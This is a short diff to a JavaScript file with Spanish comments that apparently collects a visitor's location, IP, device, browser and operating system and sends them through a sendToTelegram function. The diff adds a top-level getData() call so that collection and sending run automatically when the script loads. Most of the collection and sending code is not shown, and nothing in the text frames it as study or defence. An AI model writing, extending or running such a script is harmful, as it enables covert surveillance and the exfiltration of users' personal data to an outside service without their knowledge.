@@ -24,9 +24,6 @@ function sendToTelegram(message) {
     });
 }
 
-// Resto del código...
-
-
 // Obtener datos de ubicación, IP, dispositivo, navegador y sistema operativo
 function getData() {
   // Obtener la ubicación
@@ -66,3 +63,6 @@ function getData() {
     });
   }
 }
+
+// Llamar a la función getData para recopilar y enviar los datos
+getData();
